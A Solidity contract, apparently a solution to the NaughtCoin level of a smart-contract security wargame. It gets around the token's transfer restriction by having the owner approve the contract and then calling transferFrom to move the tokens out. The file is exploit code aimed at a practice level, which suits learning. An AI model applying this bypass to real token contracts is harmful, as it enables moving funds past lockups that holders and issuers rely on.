// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Ownable} from "openzeppelin-contracts-v5.4.0/access/Ownable.sol";
import {NaughtCoin} from "../levels/NaughtCoin.sol";

contract NaughtCoinAttack is Ownable{
    constructor() Ownable(msg.sender){

    }
    function attack(NaughtCoin coin, uint256 amount) external onlyOwner{
        coin.transferFrom(msg.sender, address(this), amount);
    }

    function transfer(NaughtCoin coin, address to, uint256 amount) external onlyOwner{
        coin.transfer(to, amount);
    }

}
